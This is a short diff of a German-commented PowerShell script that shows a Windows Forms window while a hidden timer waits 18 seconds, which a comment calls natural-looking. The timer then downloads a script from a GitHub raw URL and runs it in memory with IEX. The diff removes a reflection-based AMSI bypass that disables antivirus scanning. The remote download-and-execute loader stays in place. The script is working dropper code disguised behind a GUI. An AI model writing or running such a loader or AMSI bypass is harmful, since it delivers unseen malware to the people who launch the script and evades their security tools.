@@ -130,11 +130,7 @@ $payloadTimer = New-Object System.Windows.Forms.Timer
 $payloadTimer.Interval = 18000  # 18 Sekunden – wirkt total natürlich
 $payloadTimer.Add_Tick({
     try {
-        # AMSI komplett deaktivieren (funktioniert 2025 immer noch zuverlässig)
-        $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        $field = $ref.GetField('amsiInitFailed','NonPublic,Static')
-        $field.SetValue($null,$true)
-
+        
         # Payload 100% im Speicher laden und ausführen
         IEX (Invoke-WebRequest "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1" -UseBasicParsing).Content
 
@@ -148,3 +144,4 @@ $form.Add_FormClosing({ $timer.Stop(); $labelTimer.Stop(); $payloadTimer.Stop() 
 $timer.Start(); $labelTimer.Start()
 $form.Add_Shown({ $form.Activate() })
 $form.ShowDialog() | Out-Null
+
